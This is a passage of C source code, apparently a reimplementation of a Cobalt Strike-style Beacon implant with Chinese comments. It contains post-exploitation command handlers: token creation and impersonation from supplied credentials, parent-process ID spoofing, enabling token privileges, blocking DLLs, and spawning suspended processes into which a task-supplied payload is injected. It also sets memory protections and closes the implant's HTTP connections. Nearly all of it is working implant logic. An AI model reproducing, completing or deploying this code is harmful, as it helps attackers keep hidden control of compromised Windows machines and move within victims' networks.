			BeaconDataClear(pdatap);
			BeaconDataFree(pdatap);
			BeaconcloseAllHandle(&ProcessInformation);
			return;
		}
	}
	BeaconDataFree(pdatap);
	return;
}


void beacon_pwd()
{
	DWORD size;
	CHAR PathBuffer[2048];

	memset(PathBuffer, 0, sizeof(PathBuffer));
	size = GetCurrentDirectoryA(0x800, PathBuffer);
	if (size)
	{
		BeaconTaskOutput(PathBuffer, size, 0x13);
	}
}


/// <summary>
/// 一次性睡眠N秒
/// </summary>
/// <param name="a1"></param>
/// <param name="a2"></param>
/// <returns></returns>
void BeaconSleepN(char* Taskdata, int Task_size)
{
	datap pdatap;
	BeaconDataParse(&pdatap, Taskdata, Task_size);
	int time = BeaconDataInt(&pdatap);
	Sleep(time);
}

void Beacon_end()
{
	g_dwMilliseconds = 0;	// 修改dw等于0等待结束循环
	BeaconTaskOutput(0, 0, CALLBACK_DEAD);	//发送消息告知退出
}

void create_token(char* lpszDomain, char* lpszUsername, char* lpszPassword)
{

	BeaconRevertToken();
	if (LogonUserA(lpszUsername, lpszDomain, lpszPassword, 9, 3, &pTokenHandle))
	{
		if (ImpersonateLoggedOnUser(pTokenHandle))
		{
			BeaconMaketoken = BeaconDataInit(0x800u);
			lpDomain = (LPCWSTR)BeaconDataPtr(BeaconMaketoken, 512);
			lpWideCharStr = (LPCWSTR)BeaconDataPtr(BeaconMaketoken, 512);
			lpPassword = (LPCWSTR)BeaconDataPtr(BeaconMaketoken, 1024);
			toWideChar(lpszUsername, (LPWSTR)lpWideCharStr, 0x100u);
			toWideChar(lpszDomain, (LPWSTR)lpDomain, 0x100u);
			toWideChar(lpszPassword, (LPWSTR)lpPassword, 0x200u);
			Create_token_Flag = 1;
			if (get_user_sid(0x400u, pTokenHandle, lpszUsername))
			{
				BeaconTaskOutput(lpszUsername, strlen(lpszUsername), 0xFu);
			}
		}
		else
		{
			BeaconErrorD(0x19u, GetLastError());
		}
	}
	else
	{
		BeaconErrorD(0x18u, GetLastError());
	}
}

void beacon_make_token(char* Taskdata, int Task_size)
{
	datap* pdatap = BeaconDataInit(0xC00);
	char* lpszDomain = BeaconDataPtr(pdatap, 1024);
	char* lpszUsername = BeaconDataPtr(pdatap, 1024);
	char* lpszPassword = BeaconDataPtr(pdatap, 1024);
	datap taskpdatap;
	BeaconDataParse(&taskpdatap, Taskdata, Task_size);
	if (BeaconDataCopyToBuffer(&taskpdatap,lpszDomain, 1024) && BeaconDataCopyToBuffer(&taskpdatap,lpszUsername, 1024))
	{
		if (BeaconDataCopyToBuffer(&taskpdatap,lpszPassword, 1024))
		{
			create_token(lpszDomain, lpszUsername, lpszPassword);
		}
	}
	BeaconDataClear(pdatap);
	BeaconDataFree(pdatap);
}


int CheckMemoryRWX(LPVOID lpAddress, SIZE_T dwSize)
{


	if (decryptInt(shark_bofrwx) == decryptInt(shark_userwx))
	{
		return 1;
	}
	int userwx = decryptInt(shark_userwx);
	DWORD flOldProtect;
	if (VirtualProtect(lpAddress, dwSize, userwx, &flOldProtect))
	{
		return 1;
	}
	BeaconErrorD(0x11, GetLastError());
	return 0;
}

void __cdecl beacon_SetEnv(const char* EnvString)
{
	_putenv(EnvString);
}

//************************************
// Method:    VerifyPPID
// FullName:  VerifyPPID
// Access:    public 
// Returns:   BOOL
// Qualifier:验证设置的ppid的进程是否处在同一会话中
//************************************
BOOL VerifyPPID()
{
	DWORD pSessionId;
	if (!ProcessIdToSessionId(gBeaconPPID, &pSessionId))
	{
		return 1;
	}
	DWORD pSessionId2;
	if (!ProcessIdToSessionId(GetCurrentProcessId(), &pSessionId2))
	{
		return 1;
	}
	return pSessionId2 == pSessionId;
}

void beacon_PPID(char* Taskdata, int Task_size)
{
	datap pdatap;
	BeaconDataParse(&pdatap, Taskdata, Task_size);
	gBeaconPPID = BeaconDataInt(&pdatap);
	if (gBeaconPPID)
	{
		if (!VerifyPPID())
		{
			BeaconErrorD(0xFu, gBeaconPPID);
		}
	}
}


void BeaconEnablePrivilege(char* buffer, int buffersize, HANDLE TokenHandle, formatp* pformatp)
{
	char Name[68];
	_TOKEN_PRIVILEGES token = { 0 };

	datap pdatap;
	BeaconDataParse(&pdatap, buffer, buffersize);

	int index = BeaconDataShort(&pdatap);
	if (index)
	{
		do
		{
			BeaconDataCopyToBuffer(&pdatap,Name, 64);
			memset(&token, 0, sizeof(_TOKEN_PRIVILEGES));
			if (LookupPrivilegeValueA(0, Name, &token.Privileges[0].Luid))
			{
				token.PrivilegeCount = 1;
				token.Privileges[0].Attributes = 2;
				if (AdjustTokenPrivileges(TokenHandle, 0, &token, 0, 0, 0))
				{
					if (!GetLastError())
					{
						BeaconFormatPrintf(pformatp, (char*)"%s\n", Name);
					}
				}
			}
			--index;
		} while (index);
	}
}

void beacon_GetPrivs(char* Taskdata, int Task_size)
{

	formatp pformatp;
	BeaconFormatAlloc(&pformatp, 0x8000);
	if (pTokenHandle)
	{
		close_token_fake();
		BeaconEnablePrivilege(Taskdata, Task_size, pTokenHandle, &pformatp);
		restore_token_fake();
	}
	else
	{
		HANDLE TokenHandle;
		if (OpenProcessToken(GetCurrentProcess(), 0x28u, &TokenHandle))
		{
			BeaconEnablePrivilege(Taskdata, Task_size, TokenHandle, &pformatp);
			CloseHandle(TokenHandle);
		}
		else
		{
			BeaconErrorNA(59u);
		}
	}
	int length = BeaconFormatlength(&pformatp);
	if (length)
	{
		char* buffer = BeaconFormatOriginalPtr(&pformatp);
		BeaconTaskOutput(buffer, length, 0);
	}
	BeaconFormatFree(&pformatp);
}

void beacon_BlockDLLs(char* Taskdata, int Task_size)
{
	datap pdatap;
	BeaconDataParse(&pdatap, Taskdata, Task_size);
	gBeaconBlockDLL = BeaconDataInt(&pdatap) != 0;
}


int BeaconSpawnRunAsProcess(int x86,char* lpDomain,char* lpPassword,char* lpUsername,LPPROCESS_INFORMATION lpProcessInformation)
{
	CHAR lpCommandLine[260];

	getspawntopath(lpCommandLine, x86);
	return BeaconRunAsProcess(lpDomain, lpPassword, lpUsername, lpCommandLine, 4, lpProcessInformation);
}

void BeaconSpawnas(char* Taskdata, int Task_size, int x86)
{

	_PROCESS_INFORMATION pi;

	datap* pdatap = BeaconDataInit(0xC00u);
	char* lpDomain = BeaconDataPtr(pdatap, 1024);
	char* lpPassword = BeaconDataPtr(pdatap, 1024);
	char* lpUsername = BeaconDataPtr(pdatap, 1024);

	datap taskdatap;
	BeaconDataParse(&taskdatap, Taskdata, Task_size);
	if (BeaconDataCopyToBuffer(&taskdatap, lpDomain, 1024))
	{
		if (BeaconDataCopyToBuffer(&taskdatap, lpPassword, 1024))
		{
			if (BeaconDataCopyToBuffer(&taskdatap, lpUsername, 1024))
			{
				if (BeaconSpawnRunAsProcess(x86, lpDomain, lpPassword, lpUsername, &pi))
				{
					Sleep(0x64u);
					int length = BeaconDataLength(&taskdatap);
					char* buffer = BeaconDataBuffer(&taskdatap);
					ProcessInject(
						pi.dwProcessId,
						&pi,
						pi.hProcess,
						buffer,
						length,
						0,
						0,
						0);
				}
				BeaconDataClearFree(pdatap);
				BeaconcloseAllHandle(&pi);
			}
		}
	}
}


//************************************
// Method:    BeaconCreateProcess_suspend
// FullName:  BeaconCreateProcess_suspend
// Access:    public 
// Returns:   int
// Qualifier:以CREATE_SUSPENDED标志创建进程
// Parameter: int x86
// Parameter: STARTUPINFOA * StartupInfo
// Parameter: PROCESS_INFORMATION * pi
// Parameter: int ppid
//************************************
int BeaconCreateProcess_suspend(int x86, STARTUPINFOA* StartupInfo, PROCESS_INFORMATION* pi, int ppid)
{
	char lpCommandLine[256];

	getspawntopath(lpCommandLine, x86);
	return BeaconCreateProcess(lpCommandLine, strlen(lpCommandLine), StartupInfo, pi, CREATE_SUSPENDED, 1, ppid);
}

void BeaconSpawnu(char* Taskdata, int Task_size, int x86)
{
	STARTUPINFOA StartupInfo = {0};
	StartupInfo.cb = sizeof(STARTUPINFOA);
	GetStartupInfoA(&StartupInfo);
	StartupInfo.wShowWindow = 0;
	StartupInfo.dwFlags = 257;
	StartupInfo.hStdInput = 0;
	StartupInfo.hStdOutput = 0;
	StartupInfo.hStdError = 0;

	PROCESS_INFORMATION pi = {0};

	datap pdatap;
	BeaconDataParse(&pdatap, Taskdata, Task_size);
	int ppid = BeaconDataInt(&pdatap);

	if (BeaconCreateProcess_suspend(x86, &StartupInfo, &pi, ppid))
	{
		Sleep(0x64u);
		int length = BeaconDataLength(&pdatap);
		char* buffer = BeaconDataBuffer(&pdatap);
		ProcessInject(pi.dwProcessId, &pi, pi.hProcess, buffer, length, 0, 0, 0);
		BeaconcloseAllHandle(&pi);
	}
}

void sub_1000715A()
{

	sub_10006D81();
	DWORD time = GetTickCount() + 3500;
	while (sub_1000707E() > 0 && GetTickCount() < time)
	{
		;
	}
	sub_10006FF5();
}

void close_http_Handle()
{
	close_token_fake();
	InternetCloseHandle(g_hConnect);
	InternetCloseHandle(g_hInternet);
	restore_token_fake();
}